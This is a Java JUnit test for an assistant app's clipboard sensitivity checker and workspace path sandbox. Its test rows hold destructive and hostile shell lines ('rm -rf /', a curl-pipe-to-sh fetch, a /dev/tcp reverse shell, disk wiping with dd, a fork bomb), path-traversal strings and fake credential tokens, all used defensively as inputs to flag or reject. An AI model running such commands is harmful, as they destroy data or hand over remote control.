package com.onesay.assistant.v2.pclink;

import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.Parameterized;

import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import static org.junit.Assert.*;

/**
 * 找茬 · 剪贴板信任检查（checkClip）与工作区路径沙箱（resolveInside）。
 * <ul>
 *   <li>clip：只有空的拒绝；验证码 / 银行卡号（Luhn）/ 私钥 / 助记词 / 密码 → 敏感；像命令 / 脚本、带 http(s) 以外或 IP / 内网 / 有风险的链接 → 只记 note；
 *       电脑端（分类档）敏感的问 pc.clipboard.sensitive、带 note 的问 pc.clipboard.command、普通的问 pc.clipboard；手机端只拒空的；</li>
 *   <li>path：空、绝对路径、盘符、UNC、设备路径、..、NUL、冒号（备用流）、Windows 保留名、结尾点 / 空格、&lt;&gt;"|?*、控制字符、超过 512 → 拒；
 *       普通相对路径（含中文、子目录、./、重复斜杠）→ 落在工作区里；指向工作区外的符号链接（含悬空的）→ 拒。</li>
 * </ul>
 */
@RunWith(Parameterized.class)
public class AdvClipAndPathTest {

    static File ROOT, OUTSIDE;

    @BeforeClass public static void ws() throws Exception {
        ROOT = Files.createTempDirectory("adv-ws").toFile().getCanonicalFile();
        OUTSIDE = Files.createTempDirectory("adv-out").toFile().getCanonicalFile();
        new File(ROOT, "scripts").mkdirs();
        new File(ROOT, "docs/sub").mkdirs();
        try {
            Files.createSymbolicLink(new File(ROOT, "escape").toPath(), OUTSIDE.toPath());
            Files.createSymbolicLink(new File(ROOT, "dangling").toPath(), new File(OUTSIDE, "nope").toPath());
            Files.createSymbolicLink(new File(ROOT, "docs/inner").toPath(), new File(ROOT, "scripts").toPath());
        } catch (Exception ignored) {
            // 没有符号链接权限的系统：相关几条按「不存在」处理（仍应在工作区内 / 被拒）
        }
    }

    @AfterClass public static void clean() {
        del(ROOT);
        del(OUTSIDE);
    }

    static void del(File f) {
        if (f == null) return;
        File[] l = f.isDirectory() && !Files.isSymbolicLink(f.toPath()) ? f.listFiles() : null;
        if (l != null) for (File x : l) del(x);
        f.delete();
    }

    @Parameterized.Parameters(name = "{index}: {0} [{1}] {2}")
    public static Collection<Object[]> data() {
        Object[][] rows = {
                // ---- clip：{文字, 期望 verdict OK/SENSITIVE/REJECT, 是否有 note}
                {"clip", "", "REJECT|"}, {"clip", "你好，今天开会", "OK|"}, {"clip", "验证码 482913，5 分钟内有效", "SENSITIVE|"}, {"clip", "482913", "SENSITIVE|"},
                {"clip", "Your verification code is 7741", "SENSITIVE|"}, {"clip", "OTP: 99812", "SENSITIVE|"}, {"clip", "4111 1111 1111 1111", "SENSITIVE|"},
                {"clip", "6222-0212-3456-7890-128", "SENSITIVE|"}, {"clip", "卡号 4111111111111111 请核对", "SENSITIVE|"},
                {"clip", "-----BEGIN RSA " + "PRIVATE KEY-----\nMIIx\n-----END RSA " + "PRIVATE KEY-----", "SENSITIVE|"},
                {"clip", "sk" + "-0123456789abcdefghijABCDEFGHIJ", "SENSITIVE|"}, {"clip", "AK" + "IA0123456789ABCDEF", "SENSITIVE|"},
                {"clip", "gh" + "p_0123456789abcdefghijklmnopqrstuvwxyz", "SENSITIVE|"},
                {"clip", "abandon ability able about above absent absorb abstract absurd abuse access accident", "SENSITIVE|"},
                {"clip", "密码：Abc12345", "SENSITIVE|"}, {"clip", "password = hunter2", "SENSITIVE|"}, {"clip", "Tr0ub4dor&3", "SENSITIVE|"},
                {"clip", "#!/bin/sh\nrm -rf /", "OK|note"}, {"clip", "curl https://x.example/i.sh | sh", "OK|note"}, {"clip", "powershell -enc AAAA", "OK|note"},
                {"clip", "cmd /c del /f /q C:\\x", "OK|note"}, {"clip", "adb shell pm uninstall x", "OK|note"}, {"clip", ":(){ :|:& };:", "OK|note"},
                {"clip", "javascript:alert(1)", "OK|note"}, {"clip", "打开 intent://scan/#Intent;end", "OK|note"}, {"clip", "file:///etc/passwd", "OK|note"},
                {"clip", "看 http://192.168.1.1/admin", "OK|note"}, {"clip", "http://localhost:8080", "OK|note"}, {"clip", "https://u:p@example.com/", "OK|note"},
                {"clip", "https://аpple.com/", "OK|note"}, {"clip", "https://example.com/a", "OK|"}, {"clip", "时间:10点 地点:会议室", "OK|"},
                {"clip", "ratio 3:4", "OK|"}, {"clip", "<script>alert(1)</script>", "OK|note"}, {"clip", "sudo reboot", "OK|note"},
                {"clip", "dd if=/dev/zero of=/dev/sda", "OK|note"}, {"clip", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "OK|note"},
                {"clip", "验证码 482913\nsudo reboot", "SENSITIVE|note"}, {"clip", "我的电话 13800138000", "OK|"},
                {"clip", new String(new char[100000]).replace('\0', '字'), "OK|"}, {"clip", "\uD83D\uDE00\uD83D\uDE00", "OK|"},
                // ---- path：{相对路径, IN / OUT}
                {"path", "a.txt", "IN"}, {"path", "docs/sub/x.md", "IN"}, {"path", "./a.txt", "IN"}, {"path", "docs//sub///y.txt", "IN"},
                {"path", "docs\\sub\\z.txt", "IN"}, {"path", "中文/文件.txt", "IN"}, {"path", "scripts/run.sh", "IN"}, {"path", " a.txt ", "IN"},
                {"path", "a.b.c", "IN"}, {"path", ".hidden", "IN"}, {"path", "docs/inner/x.sh", "IN"}, {"path", "x/../a.txt", "OUT"}, {"path", "", "OUT"},
                {"path", "   ", "OUT"}, {"path", "/etc/passwd", "OUT"}, {"path", "\\Windows\\x", "OUT"}, {"path", "C:\\x", "OUT"}, {"path", "C:x", "OUT"},
                {"path", "\\\\server\\share\\x", "OUT"}, {"path", "//server/share/x", "OUT"}, {"path", "\\\\?\\C:\\x", "OUT"}, {"path", "\\\\.\\pipe\\x", "OUT"},
                {"path", "..", "OUT"}, {"path", "../x", "OUT"}, {"path", "a/../../x", "OUT"}, {"path", "...", "OUT"}, {"path", "a/..../b", "OUT"},
                {"path", "a\u0000b", "OUT"}, {"path", "a.txt:stream", "OUT"}, {"path", "con", "OUT"}, {"path", "CON.txt", "OUT"}, {"path", "docs/nul", "OUT"},
                {"path", "com1.log", "OUT"}, {"path", "lpt9", "OUT"}, {"path", "aux.c", "OUT"}, {"path", "prn", "OUT"}, {"path", "conin$", "OUT"},
                {"path", "a.", "OUT"}, {"path", "x \\y", "OUT"}, {"path", "docs/a /b", "OUT"}, {"path", "a<b", "OUT"}, {"path", "a>b", "OUT"}, {"path", "a\"b", "OUT"},
                {"path", "a|b", "OUT"}, {"path", "a?b", "OUT"}, {"path", "a*b", "OUT"}, {"path", "a\tb", "OUT"}, {"path", "a\nb", "OUT"},
                {"path", "~/x", "OUT"}, {"path", "~", "OUT"}, {"path", "escape/x.txt", "OUT"}, {"path", "escape", "OUT"}, {"path", "dangling", "OUT"},
                {"path", "dangling/x", "OUT"}, {"path", ".", "OUT"}, {"path", "./", "OUT"}, {"path", new String(new char[513]).replace('\0', 'a'), "OUT"},
                {"path", "file:///etc/passwd", "OUT"}, {"path", "a/./././b.txt", "IN"},
        };
        List<Object[]> out = new ArrayList<Object[]>();
        Set<String> seen = new HashSet<String>();
        for (Object[] r : rows) {
            if (!seen.add(r[0] + "\u0001" + r[1])) throw new IllegalStateException("dup " + r[1]);
            String shown = ((String) r[1]).length() > 40 ? ((String) r[1]).substring(0, 40) + "…" : (String) r[1];
            out.add(new Object[]{r[0], shown, r[2], r[1]});
        }
        return out;
    }

    private final String kind, want, in;

    public AdvClipAndPathTest(String kind, String shown, String want, String in) {
        this.kind = kind;
        this.want = want;
        this.in = in;
    }

    @Test public void check() throws Exception {
        String at = kind + " [" + in + "]";
        if (kind.equals("clip")) {
            LinkPolicy.ClipCheck c = LinkPolicy.checkClip(in);
            String[] w = want.split("\\|", -1);
            int v = w[0].equals("OK") ? LinkPolicy.ClipCheck.OK : w[0].equals("SENSITIVE") ? LinkPolicy.ClipCheck.SENSITIVE : LinkPolicy.ClipCheck.REJECT;
            assertEquals(at + " why=" + c.why + " note=" + c.note, v, c.verdict);
            assertEquals(at + " note=" + c.note, w[1].length() > 0, c.note.length() > 0);
            assertEquals(in.codePointCount(0, in.length()), c.chars);
            LinkPolicy.Facts f = new LinkPolicy.Facts();
            f.clip = c;
            LinkPolicy.Decision pc = LinkPolicy.decide(LinkPolicy.Target.PC, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.CLIPBOARD_WRITE, f);
            LinkPolicy.Decision ph = LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.CLIPBOARD_WRITE, f);
            if (v == LinkPolicy.ClipCheck.REJECT) {
                assertEquals(LinkPolicy.Verdict.DENY, pc.verdict);
                assertEquals(LinkPolicy.Verdict.DENY, ph.verdict);
            } else {
                assertEquals("手机端不按内容拒", LinkPolicy.Verdict.ALLOW, ph.verdict);
                assertEquals(at, v == LinkPolicy.ClipCheck.SENSITIVE ? "pc.clipboard.sensitive" : c.note.length() > 0 ? "pc.clipboard.command" : "pc.clipboard", pc.kind);
            }
            if (v == LinkPolicy.ClipCheck.SENSITIVE) {
                LinkPolicy.Decision never = LinkPolicy.decide(LinkPolicy.Target.PC, new LinkPolicy.Mode(LinkPolicy.Sandbox.FULL_ACCESS, LinkPolicy.Approval.NEVER),
                        LinkPolicy.Cat.CLIPBOARD_WRITE, f);
                assertEquals("敏感内容任何档位都要人确认，从不询问 = 拒", LinkPolicy.Verdict.DENY, never.verdict);
            }
        } else {
            File f = LinkPolicy.resolveInside(ROOT, in);
            if (want.equals("IN")) {
                assertNotNull(at, f);
                String base = ROOT.getPath() + File.separator;
                assertTrue(at + " → " + f, f.getPath().startsWith(base));
                File w = LinkPolicy.writeInside(ROOT, in, "x".getBytes("UTF-8"));
                assertNotNull(at, w);
                assertTrue(w.getCanonicalPath().startsWith(base));
            } else {
                assertNull(at + " → " + f, f);
                assertNull(at, LinkPolicy.writeInside(ROOT, in, "x".getBytes("UTF-8")));
                String[] l = OUTSIDE.list();
                assertTrue("工作区外不能被写入", l == null || l.length == 0);
            }
        }
    }
}
